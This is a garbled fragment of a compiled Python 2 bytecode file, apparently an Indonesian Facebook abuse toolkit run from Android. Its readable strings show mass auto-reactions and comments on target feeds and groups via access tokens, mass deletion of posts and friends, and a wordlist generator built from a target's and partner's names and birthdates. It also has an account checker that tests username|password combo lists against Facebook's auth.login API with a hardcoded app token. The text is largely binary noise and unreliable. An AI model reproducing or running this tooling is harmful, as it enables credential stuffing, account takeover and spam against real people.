 j d	 | d t d |   d | d  j d d  d t GHqä Wd d GHd t t t   GHt	 d  t   Wn' t k
 r d GHt	 d  t   n Xd  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s2   [1;91m[+] [1;92mInput ID Target [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mât   feedRe   Rb   s   /reactions?type=s   &access_token=s   [1;92m[[1;97mi
   s   
t    s   ... [1;92m] [1;97ms   [1;91m[+][1;92m Done [1;97ms   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] ID not found(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   RY   RZ   R[   R\   R]   R   t   reaksiR   R_   R   R   R   R
   Rx   RH   (   Ra   t   idet   limitt   oht   ahRf   Ri   (    (    s   /sdcard/hal.pyR!    s<    #
	
!%	

c          C   s¥   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s*   [1;97mâ--[1;91m> [1;92m1. [1;97mLikes*   [1;97mâ--[1;91m> [1;92m2. [1;97mLoves)   [1;97mâ--[1;91m> [1;92m3. [1;97mWows*   [1;97mâ--[1;91m> [1;92m4. [1;97mHahas,   [1;97mâ--[1;91m> [1;92m5. [1;97mSadBoys+   [1;97mâ--[1;91m> [1;92m6. [1;97mAngrys*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t   reactg_pilih(   Ra   (    (    s   /sdcard/hal.pyR  ¾  s&    c          C   sõ   t  d  }  |  d k r' d GHt   nÊ |  d k rC d a t   n® |  d k r_ d a t   n |  d k r{ d	 a t   nv |  d
 k r d a t   nZ |  d k r³ d a t   n> |  d k rÏ d a t   n" |  d k rå t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   R  R(   R  Rn   R  Ro   R  Rp   R  Rq   R  R)   (   R+   R*  R   t   reactgRx   (   R"  (    (    s   /sdcard/hal.pyR*  Ó  s4    







c    	      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t	 d  } y> t
 j d	 | d
 |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xyí t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d
 |   d | d  j d d  d t GHqLWd d GHd t t t   GHt	 d  t   Wn' t k
 rd  GHt	 d  t   n Xd  S(!   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s1   [1;91m[+] [1;92mInput ID Group [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR#  Re   Rb   s   https://graph.facebook.com/s   /reactions?type=s   [1;92m[[1;97mi
   s   
R$  s   ... [1;92m] [1;97ms   [1;91m[+][1;92m Done [1;97ms   [1;91m[!] ID not found(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   RY   RZ   R[   R\   R]   RH   R  R   t
   reaksigrupR   R_   R   R   R   R
   Rx   (	   Ra   R&  R'  R0   R   R(  R)  Rf   Ri   (    (    s   /sdcard/hal.pyR+  ñ  sL    
#
	
!%	

c          C   sÄ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHt	 d  } t	 d	  } t	 d
  } | j
 d d  } yé t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d } t j |  t j d | d | d |   d | d  j
 d d  d GHqWd d GHd t t t   GHt	 d  t   Wn' t k
 r¿d GHt	 d  t   n Xd  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;91m[!] [1;92mUse [1;97m'<>' [1;92mfor new liness,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s*   [1;91m[+] [1;92mComment [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR#  Re   Rb   s   /comments?message=s   &access_token=s   [1;92m[[1;97mi
   R$  s   ... [1;92m]s   [1;91m[+][1;92m Done [1;97ms   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] ID not found(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   R   RY   RZ   R[   R\   R]   R   t   komenR   R_   R   R
   Rx   RH   (   Ra   R&  t   kmR'  Rñ   Rf   R    t   f(    (    s   /sdcard/hal.pyR    sB    #
	
!!	

c    
      C   s,  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHt	 d  } t	 d	  } t	 d
  } | j
 d d  } y> t j d | d |   } t j | j  } d | d GHWn' t k
 rd GHt	 d  t   n Xyé t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d }	 t j |	  t j d |	 d | d |   d | d  j
 d d   d! GHqoWd d GHd" t t t   GHt	 d  t   Wn' t k
 r'd# GHt	 d  t   n Xd  S($   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;91m[!] [1;92mUse [1;97m'<>' [1;92mfor new liness,   [1;91m[+] [1;92mID Group  [1;91m:[1;97m s*   [1;91m[+] [1;92mComment [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâR#  Re   Rb   s   https://graph.facebook.com/s   /comments?message=s   [1;92m[[1;97mi
   R$  s   ... [1;92m]s   [1;91m[+][1;92m Done [1;97ms   [1;91m[!] Error(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   R   RY   RZ   R[   R\   R]   RH   Rx   R   t	   komengrupR   R_   R   R
   (
   Ra   R&  R.  R'  R0   R   Rñ   Rf   R    R/  (    (    s   /sdcard/hal.pyR  >  sR    
#
	
!!	

c          C   sõ  t  j d  yH t d d  j   }  t j d |   } t j | j  } | d } Wn7 t	 k
 r d GHt  j d  t
 j d  t   n Xt  j d  t GHd	 | GHt d
  d d GHt j d |   } t j | j  } xí | d D]á } | d } d } t j d | d |   }	 t j |	 j  }
 y3 |
 d d } d | d  j d d  d d GHWqí t k
 r¡d | d  j d d  d d GH| d 7} qí t j j k
 rÍd GHt d  t   qí Xqí Wd d GHd GHt d  t   d  S(    NR"   s	   login.txtR0   s+   https://graph.facebook.com/me?access_token=Rh   s   [1;91m[!] Token not founds   rm -rf login.txti   s)   [1;91m[+] [1;92mFrom [1;91m: [1;97m%ss"   [1;91m[+] [1;92mStart[1;97m ...i*   s
   [1;97mâs0   https://graph.facebook.com/me/feed?access_token=Re   Rb   i    s   https://graph.facebook.com/s   ?method=delete&access_token=t   errort   messages   [1;91m[[1;97mi
   s   
R$  s   ...s   [1;91m] [1;95mFaileds   [1;92m[[1;97ms   [1;92m] [1;96mDeleteds   [1;91m[!] Connection Errors   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[+] [1;92mDone(   R#   R$   RF   Rl   RY   RZ   R[   R\   R]   RI   R   R   R-   R*   R   R   t	   TypeErrorR`   R   R+   Rx   (   Ra   t   namt   lolRk   t   asut   asusRñ   Rb   t   piroRd   t   okR1  (    (    s   /sdcard/hal.pyR  j  sJ    	
	
%!
	
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t
 j d | d	 |   } t j | j  } d
 t | d  k rÚ d GHt	 d  t   n  t d  d d GHx~ | d D]r } t
 j d | d d d |   } t j | j  } d t |  k rYd | d d GHqø d | d d GHqø Wd d GHd GHt	 d  t   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s3   https://graph.facebook.com/me/friendrequests?limit=s   &access_token=s   []Re   s   [1;91m[!] No friend requests   
[1;91m[ [1;97mBack [1;91m]s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâs&   https://graph.facebook.com/me/friends/t   fromRb   s   ?access_token=R1  s    [1;97m[ [1;91mFailed[1;97m ] Rh   s    [1;97m[ [1;92mAccept[1;97m ] s   [1;91m[+] [1;92mDone(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   RY   RZ   R[   R\   R]   R   Rx   R   R_   (   Ra   R'  R0   R  R   t   gasRf   (    (    s   /sdcard/hal.pyR    s:    


	#	
c          C   sR  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  d GHd	 d
 GHyt t
 j d |   } t j | j  } xH | d D]< } | d } | d } t
 j d | d |   d | GHq½ WWn7 t k
 rn' t k
 r7d GHt d  t   n Xd GHt d  t   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s$   [1;91m[âº] [1;92mStart [1;97m...s   [1;97mStop [1;91mCTRL+Ci*   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=Re   Rh   Rb   s*   https://graph.facebook.com/me/friends?uid=s   &access_token=s!   [1;97m[[1;92m Deleted [1;97m] s   [1;91m[!] Stoppeds   
[1;91m[ [1;97mBack [1;91m]s   
[1;91m[+] [1;92mDone(   R#   R$   RF   Rl   RI   R   R   R-   R*   R   RY   RZ   R[   R\   R]   t   deletet
   IndexErrorR   R+   Rx   (   Ra   R  R   R   Rk   Rb   (    (    s   /sdcard/hal.pyR  ³  s<    
	

 

c          C   s    t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s1   [1;97mâ--[1;91m> [1;92m1.[1;97m Create Posts5   [1;97mâ--[1;91m> [1;92m2.[1;97m Create Wordlists5   [1;97mâ--[1;91m> [1;92m3.[1;97m Account Checkers7   [1;97mâ--[1;91m> [1;92m4.[1;97m See my group lists3   [1;97mâ--[1;91m> [1;92m5.[1;97m Profile Guards*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t
   pilih_lain(   Ra   (    (    s   /sdcard/hal.pyRy   Õ  s$    c          C   s»   t  d  }  |  d k r' d GHt   n |  d k r= t   nz |  d k rS t   nd |  d k ri t   nN |  d k r t   n8 |  d k r t   n" |  d	 k r« t   n d GHt   d  S(
   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   R(   Rn   Ro   Rp   R)   (   R+   R>  t   statusRû   t
   check_akunt   grupsayat   guardRG   (   t   other(    (    s   /sdcard/hal.pyR>  é  s$    






c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } | d k r£ d	 GHt	 d
  t
   n^ t j d | d |   } t j | j  } t d  d d GHd | d GHt	 d
  t
   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s.   [1;91m[+] [1;92mType status [1;91m:[1;97m R   s   [1;91m[!] Don't be emptys   
[1;91m[ [1;97mBack [1;91m]s7   https://graph.facebook.com/me/feed?method=POST&message=s   &access_token=s%   [1;91m[âº] [1;92mCreate [1;97m...i*   s
   [1;97mâs,   [1;91m[+] [1;92mStatus ID[1;91m : [1;97mRb   (   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   Ry   RY   RZ   R[   R\   R]   R   (   Ra   t   msgt   resR   (    (    s   /sdcard/hal.pyR?  ÿ  s,    


	
c       Ð   C   s4  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy¤t  j d  t GHd GHd d	 GHt	 d
  } t | d d  } t	 d  } t	 d  } t	 d  } t	 d  } | d d !} | d d !} | d }	 d d	 GHd GHt	 d  }
 t	 d  } t	 d  } t
 d  | d d !} | d d !} | d } | j d | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | | |	 | | | |	 | | | | | |	 | | |	 | |	 | |	 |	 |	 | | | | |	 | | | | | |	 | | | | | |	 | | | | | |	 | |
 | | | | |
 | |
 | |
 | | |
 | | | | | |
 | | | | | | | | | | | | | | | | | | | | | | | | | | |
 | |
 | |
 | | | | | | | | | fÎ  d } x5 | d k  r| d } | j | t |  d  qÚWd } x5 | d k  rL| d } | j |
 t |  d  qWd } x5 | d k  r| d } | j | t |  d  qVWd } x5 | d k  rÈ| d } | j | t |  d  qW| j   t j d  d d	 GHd | GHt	 d  t   Wn) t k
 r/} d GHt	 d  t   n Xd  S(    NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s?   [1;91m[?] [1;92mFill in the complete data of the target belowi*   s
   [1;97mâs&   [1;91m[+] [1;92mNama Depan [1;97m: s   .txtR   s'   [1;91m[+] [1;92mNama Tengah [1;97m: s)   [1;91m[+] [1;92mNama Belakang [1;97m: s*   [1;91m[+] [1;92mNama Panggilan [1;97m: s>   [1;91m[+] [1;92mTanggal Lahir >[1;96mex: |DDMMYY| [1;97m: i    i   i   s)   [1;91m[?] [1;93mKalo Jomblo SKIP aja :vs&   [1;91m[+] [1;92mNama Pacar [1;97m: s0   [1;91m[+] [1;92mNama Panggilan Pacar [1;97m: sD   [1;91m[+] [1;92mTanggal Lahir Pacar >[1;96mex: |DDMMYY| [1;97m: s%   [1;91m[âº] [1;92mCreate [1;97m...sü  %s%s
%s%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%sid   s   
g      ø?s/   [1;91m[+] [1;92mSaved [1;91m: [1;97m %s.txts   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Failed(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   R   R   R   R^   Ry   (   Ra   Rf   RÉ   Rß   Rà   R   R   R/  t   gt   hR   R   t   kt   lt   mR¦   t   wgt   ent   wordt   gen(    (    s   /sdcard/hal.pyRû   	  sx    	
	

ÿ ÿ }




		

c          C   s@  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd d	 GHg  } g  } g  } y% t	 d
  } t | d  j
   } Wn' t k
 rà d GHt	 d  t   n Xt	 d  } t d  d d	 GHxâ | D]Ú } | j   j t |   \ } }	 d | d |	 d }
 t j |
  } t j | j  } d | k r| j |	  d | d |	 GHqd | d k rÃ| j |	  d | d |	 GHq| j |	  d | d |	 GHqWd d	 GHd t t |   d t t |   d t t |   GHt	 d  t   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   sB   [1;91m[?] [1;92mCreate in file[1;91m : [1;97musername|passwordi*   s
   [1;97mâs,   [1;91m[+] [1;92mFile path [1;91m:[1;97m s   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]s,   [1;91m[+] [1;92mSeparator [1;91m:[1;97m s$   [1;91m[âº] [1;92mStart [1;97m...s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RD   s%   [1;97m[ [1;92mLive[1;97m ] [1;97mRÑ   s   www.facebook.comR²   s&   [1;97m[ [1;93mCheck[1;97m ] [1;97ms$   [1;97m[ [1;91mDie[1;97m ] [1;97ms4   [1;91m[+] [1;92mTotal[1;91m : [1;97mLive=[1;92ms    [1;97mCheck=[1;93ms    [1;97mDie=[1;91m(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   Rò   Ry   R   RÕ   RÒ   R   RY   RZ   R[   R\   R]   R   R
   (   Ra   t   liveRÞ   t   dieRÉ   t   listt   pemisaht   mekiRÛ   R6   Rd   Re   RÜ   (    (    s   /sdcard/hal.pyR@  V	  sT    	

	!	=
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j d  Wn t	 k
 r n Xt  j d  t
 GHyÔ t j d |   } t j | j  } xp | d	 D]d } | d
 } | d } t d d  } t j |  | j | d  d t |  d t |  GHqÊ Wd d GHd t t  GHd GH| j   t d  t   Wn¨ t t f k
 rd GHt d  t   n| t k
 rÍt  j d  d GHt d  t   nI t j j k
 rïd GHt   n' t k
 rd GHt d  t   n Xd  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s2   https://graph.facebook.com/me/groups?access_token=Re   Rh   Rb   s   out/Grupid.txtR   s   
s!   [1;97m[ [1;92mMyGroup[1;97m ] s    => i*   s
   [1;97mâs0   [1;91m[+] [1;92mTotal Group [1;91m:[1;97m %ss6   [1;91m[+] [1;92mSaved [1;91m: [1;97mout/Grupid.txts   
[1;91m[ [1;97mBack [1;91m]s   [1;91m[!] Stoppeds   [1;91m[!] Group not founds   [1;91m[â] No Connections   [1;91m[!] Error(   R#   R$   RF   Rl   RI   R   R   R-   R   R   R*   RY   RZ   R[   R\   R]   t   listgrupR   R   R   R
   R^   R+   Ry   R   R   RH   Rz   R`   R   R,   (   Ra   t   uht   gudRñ   Rk   Rb   R/  (    (    s   /sdcard/hal.pyRA  	  s\    

!	







c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHt
 d  }  |  d k r´ d } t t |  nU |  d k rÖ d } t t |  n3 |  d k rì t   n |  d k rt   n t   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s.   [1;97mâ--[1;91m> [1;92m1.[1;97m Activates2   [1;97mâ--[1;91m> [1;92m2.[1;97m Not activates*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   âs   [1;97mââ[1;91mD [1;97mR'   t   trueR(   t   falseR)   R   (   R#   R$   RF   Rl   Ra   RI   R   R   R-   R*   R+   RÁ   Ry   R,   (   RF  t   aktift   non(    (    s   /sdcard/hal.pyRB  µ	  s4    

c         C   s3   d |  } t  j |  } t j | j  } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sRb   (   RY   RZ   R[   R\   R]   (   Ra   Rd   RE  t   uid(    (    s   /sdcard/hal.pyt
   get_useridÓ	  s    
c         C   sç   t  |   } d | t |  f } i d d 6d |  d 6} d } t j | d | d | } | j GHd	 | j k r t j d
  t GHd GHt d  t	   nF d | j k r× t j d
  t GHd GHt d  t	   n d GHt
   d  S(   Ns  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st   Authorizations"   https://graph.facebook.com/graphqlRe   t   headerss   "is_shielded":trueR"   s*   [1;91m[[1;96mâ[1;91m] [1;92mActivates   
[1;91m[ [1;97mBack [1;91m]s   "is_shielded":falses.   [1;91m[[1;96mâ[1;91m] [1;91mNot activates   [1;91m[!] Error(   R\  R   RY   R_   R]   R#   R$   R*   R+   Ry   R,   (   Ra   t   enableRb   Re   R^  Rd   RE  (    (    s   /sdcard/hal.pyRÁ   Ù	  s(    



(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(t   R#   R   R   t   datetimeR   RU   R   RË   R[   RJ   R¸   t	   cookielibt   multiprocessing.poolR    RL   t   ImportErrorR$   RY   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRK   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   R   R   R*   R!   RÖ   RÏ   R×   RØ   Rã   RÙ   R   R   R   R¡   R¢   Rb   R£   R¤   R¥   R§   R%  R,  R-  R0  RT  t   vulnott   vulnR&   R%   R-   R.   RG   Rm   Ru   Rv   R   R   R   R   R   R   R2   R   R   R   Rw   R¨   R©   Rª   RÍ   R«   R¬   Rá   R­   Ró   R®   Rý   Rþ   Rÿ   R   R  Rx   R  R  R  R!  R  R*  R+  R  R  R  R  R  Ry   R>  R?  Rû   R@  RA  RB  R\  RN   RÁ   (    (    (    s   /sdcard/hal.pyt   <module>   sÎ   
		
						:		)	#	7		"	2	;	:	@	@	7	A	9	A			³		&			Ë	6				=	F	F	?					!			)	$	,	(	!	"				=	.	1		